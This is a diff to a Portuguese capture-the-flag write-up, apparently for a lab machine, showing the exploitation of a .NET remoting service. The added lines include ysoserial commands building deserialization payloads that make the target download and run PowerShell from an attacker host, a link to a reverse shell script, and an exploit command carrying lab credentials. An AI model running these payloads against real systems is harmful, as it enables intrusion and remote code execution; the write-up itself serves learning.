@@ -19,6 +19,8 @@ nmap
 smbclient
 rpcclient
 ExploitRemotingService
+netcat
+python
 ysoserial
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -151,12 +153,24 @@ Pesquisando sobre como interagir com esse serviço, encontramos um exploit que i
 Podemos compilar ele em nossa máquina, ou já fazer o download dele [compilado](https://github.com/parteeksingh005/ExploitRemotingService_Compiled).
 
 Agora precisamos preparar nosso payload que enviaremos atraves do ExploitRemotingService.
-Para isso vamos precisar do python, netcat e também do [yososerial](https://github.com/pwntester/ysoserial.net).
+Para isso vamos precisar do python, [netcat](https://eternallybored.org/misc/netcat/) e também do [yososerial](https://github.com/pwntester/ysoserial.net).
 
+Devemos compilar o yososerial ou baixa-lo já [compilado](https://github.com/pwntester/ysoserial.net/releases/tag/v1.34).
 
+Após isso, devemos preparar nossa shell.
+Usaremos está [shell.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('10.10.14.136/chu.ps1')"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.128/winpeas.exe')"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo 
 
@@ -177,5 +191,6 @@ https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/
 https://docs.microsoft.com/pt-br/dotnet/api/system.runtime.remoting.channels.tcp?view=netframework-4.8
 https://docs.microsoft.com/pt-br/dotnet/api/system.runtime.remoting.channels.tcp.tcpchannel?view=netframework-4.8
 https://github.com/tyranid/ExploitRemotingService
+https://eternallybored.org/misc/netcat/
 https://github.com/pwntester/ysoserial.net
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
